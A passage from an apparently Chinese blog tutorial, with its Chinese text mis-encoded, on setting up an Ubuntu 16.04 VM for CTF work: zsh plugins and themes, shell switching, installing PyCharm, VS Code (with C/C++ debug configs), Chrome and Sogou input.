çš„é»˜è®¤ä¿å­˜åœ°å€ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">plugins</span><span class="token operator">=</span><span class="token punctuation">(</span>git zsh-autosuggestions zsh-syntax-highlighting<span class="token punctuation">)</span><span class="token builtin class-name">source</span> /opt/oh-my-zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA12.png" alt="Ubuntu16.04è™šæ‹ŸæœºPWNç¯å¢ƒæ­å»º12.png"></p><p>å°†æ’ä»¶å…‹éš†åˆ°æœ¬åœ°ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ›´æ–° <code>~/.zshrc</code> ä½¿é…ç½®ç”Ÿæ•ˆï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®‰è£… <code>zsh-syntax-highlighting</code> åï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA22.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º22.png"></p><p>å‘½ä»¤ä¸ºç»¿è‰²ä»£è¡¨æ­£ç¡®ï¼Œçº¢è‰²ä»£è¡¨è¾“å…¥é”™è¯¯</p><hr><h2 id="æ›´æ¢-ZSH-ç»ˆç«¯ä¸»é¢˜"><a href="#æ›´æ¢-ZSH-ç»ˆç«¯ä¸»é¢˜" class="headerlink" title="æ›´æ¢ ZSH ç»ˆç«¯ä¸»é¢˜"></a>æ›´æ¢ ZSH ç»ˆç«¯ä¸»é¢˜</h2><blockquote><p>zsh ç»ˆç«¯è‡ªå¸¦å¾ˆå¤šä¸åŒé£æ ¼çš„ä¸»é¢˜ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„å–œå¥½æ›´æ¢</p></blockquote><p>æŸ¥çœ‹ <code>zsh</code> è‡ªå¸¦çš„ä¸»é¢˜ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/.oh-my-zsh/themes <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA24.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º24.png"></p><p>æ‰“å¼€ <code>zsh</code> é…ç½®æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœç´¢ <code>ZSH_THEME</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA23.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º23.png"></p><p>é»˜è®¤ä¸»é¢˜æ˜¯ <code>robbyrussell</code>ï¼Œå¯ä»¥æ ¹æ®ä¸ªäººå–œå¥½è‡ªè¡Œä¿®æ”¹</p><p>å¦‚æœè®¾ç½®ä¸ºï¼š<code>ZSH_THEME=&quot;random&quot;</code>ï¼Œåˆ™æ¯æ¬¡æ‰“å¼€ç»ˆç«¯æ—¶ï¼Œä¸»é¢˜éƒ½æ˜¯éšæœºçš„</p><p>å¦‚æœä¸çŸ¥é“é€‰å“ªä¸ªä¸»é¢˜å¥½ï¼Œä¹Ÿå¯ä»¥å…ˆå°†ä¸»é¢˜è®¾ç½®ä¸ºéšæœºï¼Œç„¶åæ¯æ¬¡æ‰“å¼€ <code>zsh</code> åéƒ½ä¼šæ˜¾ç¤ºï¼š<br><code>[oh-my-zsh] Random theme &#39;xxx&#39; loaded</code><br>å…¶ä¸­ <code>xxx</code> å°±æ˜¯è¯¥ä¸»é¢˜çš„åå­—ï¼Œé‡åˆ°å–œæ¬¢çš„ï¼Œå°±å°†å…¶åŠ åˆ° <code>ZSH_THEME</code> ä¸­</p><p>ä¿®æ”¹å¥½åï¼Œæ›´æ–° <code>~/.zshrc</code> ä½¿é…ç½®ç”Ÿæ•ˆï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»¥ä¸‹ä¸»é¢˜æ ·å¼å¯ä¾›å‚è€ƒï¼š</p><ol><li><code>af-magic</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%981.png" alt="ZSHç»ˆç«¯ä¸»é¢˜1.png"></p><ol start="2"><li><code>bira</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%982.png" alt="ZSHç»ˆç«¯ä¸»é¢˜2.png"></p><ol start="3"><li><code>fox</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%983.png" alt="ZSHç»ˆç«¯ä¸»é¢˜3.png"></p><ol start="4"><li><code>xiong-chiamiov</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%984.png" alt="ZSHç»ˆç«¯ä¸»é¢˜4.png"></p><ol start="5"><li><code>gianu</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%985.png" alt="ZSHç»ˆç«¯ä¸»é¢˜5.png"></p><blockquote><p>æ›´å¤šä¸»é¢˜è¯·æŸ¥çœ‹ï¼š<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/themes#pygmalion">Themes Â· ohmyzsh&#x2F;ohmyzsh Wiki (github.com)</a></p></blockquote><hr><h2 id="åˆ‡æ¢-shell-ç»ˆç«¯"><a href="#åˆ‡æ¢-shell-ç»ˆç«¯" class="headerlink" title="åˆ‡æ¢ shell ç»ˆç«¯"></a>åˆ‡æ¢ shell ç»ˆç«¯</h2><p>æŸ¥çœ‹ç³»ç»Ÿå·²å®‰è£…çš„ shellï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/shells<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„ shellï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token environment constant">$SHELL</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>ä¸´æ—¶åˆ‡æ¢ shellï¼š</li></ol><p>ç›´æ¥è¾“å…¥ shell çš„åç§°å³å¯ï¼Œåˆ‡æ¢ zsh å°±ç»ˆç«¯è¾“å…¥ zshï¼Œåˆ‡æ¢ bash å°±ç»ˆç«¯è¾“å…¥ bash</p><ol start="2"><li>æ°¸ä¹…åˆ‡æ¢ shellï¼š</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å°†ç»ˆç«¯æ°¸ä¹…åˆ‡æ¢ä¸º zsh</span><span class="token function">sudo</span> chsh <span class="token parameter variable">-s</span> /bin/zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h1 id="ç¼–è¾‘å™¨å’Œ-IDE"><a href="#ç¼–è¾‘å™¨å’Œ-IDE" class="headerlink" title="ç¼–è¾‘å™¨å’Œ IDE"></a>ç¼–è¾‘å™¨å’Œ IDE</h1><h2 id="å®‰è£…-Pycharm-x2F-CLion"><a href="#å®‰è£…-Pycharm-x2F-CLion" class="headerlink" title="å®‰è£… Pycharm&#x2F;CLion"></a>å®‰è£… Pycharm&#x2F;CLion</h2><blockquote><p>Ubuntu 16.04 çš„åº”ç”¨å•†åº—æ²¡æœ‰ Pycharm å’Œ CLionï¼Œåªèƒ½è‡ªå·±é€šè¿‡å®‰è£…åŒ…å®‰è£…</p></blockquote><p>å®˜ç½‘ä¸‹è½½ Linux ç‰ˆï¼š<a href="https://www.jetbrains.com/pycharm/download/?section=linux">Download PyCharm: Python IDE for Professional Developers by JetBrains</a></p><p>ä»¥ pycharm-community-2021.3.3.tar.gz ä¸ºä¾‹ï¼ˆä¸“ä¸šç‰ˆåŒç†ï¼‰</p><p>è§£å‹å¹¶ç§»åŠ¨åˆ°Â <code>/opt</code>Â ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> pycharm-community-2021.3.3.tar.gz<span class="token function">sudo</span> <span class="token function">mv</span> pycharm-community-2021.3.3 /opt/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è§£å‹åè¿›å…¥ Pycharm çš„ bin ç›®å½•ï¼Œè¿è¡Œ Pycharmï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/pycharm-community-2021.3.3/bin<span class="token function">sudo</span> ./pycharm.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿è¡Œè½¯ä»¶åï¼š<code>å·¥å…·æ  â€“&gt; Tools â€“&gt; Create Desktop Entery</code> å¯ä»¥åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼ï¼Œå¹¶å°†å›¾æ ‡åŠ å…¥å¼€å§‹èœå•</p><blockquote><p>å¦‚æœä¸æƒ³ç”¨äº†ï¼Œå¯ä»¥å‚ç…§å®˜æ–¹å¸è½½æ–¹æ³•ï¼š<a href="https://www.jetbrains.com/help/pycharm/uninstall.html">å¸è½½ PyCharm | PyCharm æ–‡æ¡£ (jetbrains.com)</a></p></blockquote><p>æ‰“å¼€ Pycharm åï¼Œå¦‚æœç•Œé¢æ˜¾ç¤ºå¼‚å¸¸ï¼Œæ¯”å¦‚å„ç§æŒ‰é”®çš„æ–¹æ¡†æ˜¾ç¤ºä¸å…¨ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA5.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º5.png"></p><p><strong>ä¸€èˆ¬è™šæ‹Ÿæœºä¸­çš„å„ç§æ˜¾ç¤ºé—®é¢˜ bugï¼Œéƒ½å’Œ VM çš„ 3D å›¾å½¢åŠ é€Ÿæœ‰å…³</strong>ï¼Œå…³æ‰å³å¯æ­£å¸¸æ˜¾ç¤ºï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA6.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º6.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA7.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º7.png"></p><hr><h2 id="å®‰è£…-VScode"><a href="#å®‰è£…-VScode" class="headerlink" title="å®‰è£… VScode"></a>å®‰è£… VScode</h2><blockquote><p>Ubuntu 16.04 çš„åº”ç”¨å•†åº—æ²¡æœ‰ VScodeï¼Œåªèƒ½è‡ªå·±é€šè¿‡å®‰è£…åŒ…å®‰è£…</p></blockquote><p>ä¸‹è½½è½¯ä»¶åŒ…ï¼š<a href="https://packages.microsoft.com/repos/vscode/pool/main/c/code/">Microsoft VScode</a></p><p>å®‰è£…ï¼Œä»¥ code_1.74.2-1671533413_amd64.deb ä¸ºä¾‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> code_1.74.2-1671533413_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®‰è£…å¥½åï¼Œå¦‚æœ Ubuntu 16.04 è®¾ç½®äº†ä»£ç†ï¼Œåœ¨ VScode ä¸­æ‰©å±•ä¼šæ— æ³•è®¿é—®ï¼š<code>XHR failed</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA3.png" alt="Ubuntu16.04è™šæ‹ŸæœºPWNç¯å¢ƒæ­å»º3.png"></p><p>å…¶å®æ˜¯æ•´ä¸ª VScode éƒ½æ— æ³•è¿æ¥ç½‘ç»œï¼Œä¹Ÿæ— æ³•ç™»å½•è´¦æˆ·åŒæ­¥</p><p>è§£å†³åŠæ³•ï¼š</p><p>åœ¨ VScode çš„è®¾ç½®ä¸­æœç´¢ <code>proxy</code> ï¼ˆä»£ç†ï¼‰ï¼Œæ‰¾åˆ° <code>Httpï¼šProxy</code> è¿™ä¸€é¡¹</p><p>åœ¨ <code>Httpï¼šProxy</code> ä¸­å¡«å…¥ HTTP ä»£ç†çš„ IP åœ°å€å’Œç«¯å£å·ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA5.png" alt="Ubuntu16.04è™šæ‹ŸæœºPWNç¯å¢ƒæ­å»º5.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA4.png" alt="Ubuntu16.04è™šæ‹ŸæœºPWNç¯å¢ƒæ­å»º4.png"></p><p>åˆ·æ–°ä¸€ä¸‹æ‰©å±•ï¼Œæ‰©å±•è®¿é—®æ­£å¸¸</p><p>å¦‚æœä¸ä½¿ç”¨ä»£ç†ï¼Œåˆ™åŒæ—¶å…³é—­ Ubuntu å’Œ VScode çš„ä»£ç†è®¾ç½®</p><hr><h3 id="é…ç½®-C-x2F-C"><a href="#é…ç½®-C-x2F-C" class="headerlink" title="é…ç½® C&#x2F;C++"></a>é…ç½® C&#x2F;C++</h3><blockquote><p>é¦–å…ˆè¦å®‰è£…å¥½ <code>gcc</code>ã€<code>g++</code>ã€<code>gdb</code> ç¯å¢ƒ</p></blockquote><p>å®‰è£… <code>C/C++</code> å’Œ <code>Code Runner</code> æ’ä»¶</p><p>ä½¿ç”¨ VScode è°ƒè¯•ï¼š<br>æ–°å»º <code>.vscode</code> æ–‡ä»¶å¤¹ï¼Œåœ¨ <code>.vscode</code> æ–‡ä»¶å¤¹ä¸‹æ–°å»ºä¸¤ä¸ªæ–‡ä»¶ï¼š<code>launch.json</code> å’Œ <code>tasks.json</code></p><p><strong>ä»¥ååœ¨å…¶ä»–çš„æ–‡ä»¶å¤¹ä¸­è¦è°ƒè¯•éƒ½è¦é‡å»º <code>.vscode</code> å­æ–‡ä»¶å¤¹å¹¶é…ç½®</strong></p><ul><li><code>launch.json</code> å†…å®¹ï¼š</li></ul><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span>    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"C/C++"</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"cppdbg"</span><span class="token punctuation">,</span>            <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span>            <span class="token property">"program"</span><span class="token operator">:</span> <span class="token string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;"</span><span class="token punctuation">,</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"stopAtEntry"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"$&#123;workspaceFolder&#125;"</span><span class="token punctuation">,</span>            <span class="token property">"environment"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"externalConsole"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"MIMode"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>            <span class="token property">"preLaunchTask"</span><span class="token operator">:</span> <span class="token string">"compile"</span><span class="token punctuation">,</span>            <span class="token property">"setupCommands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                    <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Enable pretty-printing for gdb"</span><span class="token punctuation">,</span>                    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"-enable-pretty-printing"</span><span class="token punctuation">,</span>                    <span class="token property">"ignoreFailures"</span><span class="token operator">:</span> <span class="token boolean">true</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>tasks.json</code> å†…å®¹ï¼š</li></ul><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"2.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"tasks"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>            <span class="token property">"label"</span><span class="token operator">:</span> <span class="token string">"compile"</span><span class="token punctuation">,</span>            <span class="token property">"command"</span><span class="token operator">:</span> <span class="token string">"g++"</span><span class="token punctuation">,</span>   <span class="token comment">// c æ–‡ä»¶ä¸º gcc, cpp æ–‡ä»¶ä¸º g++</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"-g"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;file&#125;"</span><span class="token punctuation">,</span>                <span class="token string">"-o"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"problemMatcher"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"owner"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>                <span class="token property">"fileLocation"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                    <span class="token string">"relative"</span><span class="token punctuation">,</span>                    <span class="token string">"$&#123;workspaceRoot&#125;"</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token property">"pattern"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"regexp"</span><span class="token operator">:</span> <span class="token string">"^(.*):(\\d+):(\\d+):\\s+(warning|error):\\s+(.*)$"</span><span class="token punctuation">,</span>                    <span class="token property">"file"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>                    <span class="token property">"line"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>                    <span class="token property">"column"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>                    <span class="token property">"severity"</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>                    <span class="token property">"message"</span><span class="token operator">:</span> <span class="token number">5</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"group"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"build"</span><span class="token punctuation">,</span>                <span class="token property">"isDefault"</span><span class="token operator">:</span> <span class="token boolean">true</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="é…ç½®-Python"><a href="#é…ç½®-Python" class="headerlink" title="é…ç½® Python"></a>é…ç½® Python</h3><blockquote><p>é¦–å…ˆè¦å®‰è£…å¥½ <code>python</code> ç¯å¢ƒ</p></blockquote><p>å®‰è£…æ’ä»¶ <code>Code Runner</code> å³å¯ï¼Œå…¶ä»–æ’ä»¶ï¼š<code>Pylance</code>ã€<code>Python</code></p><p><code>Code Runner</code> æ’ä»¶çš„ä»£ç è¿è¡ŒæŒ‡ä»¤å¯åœ¨ <code>æ‰©å±• -&gt; Code Runner -&gt; æ‰©å±•è®¾ç½® -&gt; Code-runner: Executor Map -&gt; åœ¨ settings.json ä¸­ç¼–è¾‘</code> è¿›è¡Œè‡ªå®šä¹‰</p><hr><h3 id="ä½¿ç”¨å’Œä¸€äº›é—®é¢˜"><a href="#ä½¿ç”¨å’Œä¸€äº›é—®é¢˜" class="headerlink" title="ä½¿ç”¨å’Œä¸€äº›é—®é¢˜"></a>ä½¿ç”¨å’Œä¸€äº›é—®é¢˜</h3><blockquote><p>å¦‚æœæ˜¯ä» snap å•†åº—å®‰è£…çš„ VScode å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œå¦‚æœæ˜¯è‡ªå·±é€šè¿‡ .deb åŒ…å®‰è£…ï¼Œå¯èƒ½éœ€è¦å°† code æ·»åŠ åˆ°ç¯å¢ƒå˜é‡</p></blockquote><p>ä»ç»ˆç«¯æ‰“å¼€ VScodeï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">code<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨ VScode åˆ›å»ºæ–‡ä»¶å¹¶ç¼–è¾‘ï¼š ï¼ˆç±»ä¼¼äº VIMï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">code æ–‡ä»¶å<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>æ³¨æ„ï¼š<br><strong>åœ¨ VScode ä¸­ä½¿ç”¨ç»å¯¹è·¯å¾„ä¸€èˆ¬æ²¡é—®é¢˜ï¼Œä½†æ˜¯ä½¿ç”¨ç›¸å¯¹è·¯å¾„ <code>./</code> å¯èƒ½ä¼šå‡ºé—®é¢˜</strong><br>è¿™å¹¶ä¸æ˜¯è·¯å¾„é”™äº†ï¼Œè€Œæ˜¯ <em>VScode é»˜è®¤çš„ç›¸å¯¹è·¯å¾„æ˜¯é’ˆå¯¹ <code>.vscode</code> æ–‡ä»¶å¤¹æ‰€åœ¨çš„ç›®å½•ï¼Œè€Œä¸æ˜¯å½“å‰ç¼–è¾‘çš„æ–‡ä»¶æ‰€åœ¨ç›®å½•</em><br><em><code>.vscode</code> æ–‡ä»¶å¤¹é»˜è®¤æ”¾ç½®åœ¨ç”¨æˆ·å®¶ç›®å½•ä¸‹ï¼š<code>~/</code></em></p></blockquote><p>è§£å†³åŠæ³•ï¼š</p><ul><li>æ‰“å¼€ VScode è®¾ç½®ï¼Œåœ¨ <code>Code Runner</code> æ’ä»¶ä¸­æœç´¢ï¼š<code>File Directory As Cwd</code>ï¼Œå°†ä¸‹é¢çš„é€‰é¡¹æ‰“ä¸Šå‹¾ï¼Œé‡æ–°æ‰“å¼€ç¼–è¾‘çš„æ–‡ä»¶ï¼Œå³å¯æ­£å¸¸</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA2.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º2.png"></p><ul><li>å¦‚æœä¸ä½¿ç”¨ <code>Code Runner</code>ï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨ <code>Python</code> æ’ä»¶ï¼Œåˆ™åœ¨ <code>Python</code> æ’ä»¶ä¸­æœç´¢ï¼š<code>Execute ln File Dir</code>ï¼Œå°†ä¸‹é¢çš„é€‰é¡¹æ‰“ä¸Šå‹¾ï¼Œé‡æ–°æ‰“å¼€ç¼–è¾‘çš„æ–‡ä»¶ï¼Œå³å¯æ­£å¸¸</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA4.png" alt="Linuxè™šæ‹ŸæœºCTFç¯å¢ƒæ­å»º4.png"></p><hr><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><h2 id="å®‰è£…-Chrome-æµè§ˆå™¨"><a href="#å®‰è£…-Chrome-æµè§ˆå™¨" class="headerlink" title="å®‰è£… Chrome æµè§ˆå™¨"></a>å®‰è£… Chrome æµè§ˆå™¨</h2><blockquote><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œâ€œChrome æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„æµè§ˆå™¨â€ ï¼ˆæ‰‹åŠ¨ç‹—å¤´ï¼‰</p></blockquote><p>ç”±äºæœ€æ–°ç‰ˆçš„ Chrome å·²ç»ä¸æ”¯æŒ Ubuntu 16.04 äº†ï¼Œå› æ­¤éœ€è¦è‡ªå·±ä¸‹è½½æ—§ç‰ˆæœ¬çš„ deb åŒ…è¿›è¡Œå®‰è£…</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://www.chromedownloads.net/chrome64linux/">Chrome Downloads</a></p><p>ä¸‹è½½åè§£å‹ï¼Œç›´æ¥å®‰è£… deb åŒ…å³å¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> google-chrome-stable_current_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœå®‰è£…æŠ¥é”™ï¼Œè¯´æ˜ç‰ˆæœ¬ä¸åˆé€‚ï¼Œè¯·é€‰æ‹©å…¶ä»–æ›´æ—§çš„ç‰ˆæœ¬</p><p>æ¨èç‰ˆæœ¬ï¼š<a href="https://www.chromedownloads.net/chrome64linux-stable/1266.html" title="chrome_linux64_stable_101.0.4951.54">chrome_linux64_stable_101.0.4951.54</a></p><hr><h2 id="å®‰è£…æœç‹—è¾“å…¥æ³•"><a href="#å®‰è£…æœç‹—è¾“å…¥æ³•" class="headerlink" title="å®‰è£…æœç‹—è¾“å…¥æ³•"></a>å®‰è£…æœç‹—è¾“å…¥æ³•</h2><p>ä¸‹è½½ Linux ç‰ˆæœç‹—è¾“å…¥æ³•ï¼š<a href="http://cdn2.ime.sogou.com/dl/index/1571302197/sogoupinyin_2.3.1.0112_amd64.deb?st=EDsKarP7mjX2oPmtqBOCJA&e=1589200310&fn=sogoupinyin_2.3.1.0112_amd64.deb">sogoupinyin_2.3.1.0112_amd64.deb</a></p><p>ä»¥å‚è€ƒå®‰è£…æ­¥éª¤ä¸­çš„ <code>sogoupinyin_2.3.1.0112_amd64.deb</code> ç‰ˆæœ¬ä¸ºä¸»ï¼Œä½¿ç”¨å¤ªæ–°çš„ç‰ˆæœ¬ä¼šå¯¼è‡´ Ubuntu é‡å¯åæ— æ³•è¿›å…¥æ¡Œé¢</p><p>å‚è€ƒå®‰è£…æ­¥éª¤ï¼š<a href="https://blog.csdn.net/weixin_44205779/article/details/107464267">ã€Ubuntuã€‘Ubuntu16.04å®‰è£… æœç‹—è¾“å…¥æ³• å²ä¸Šæœ€è¯¦ç»†_ubuntu 16.04 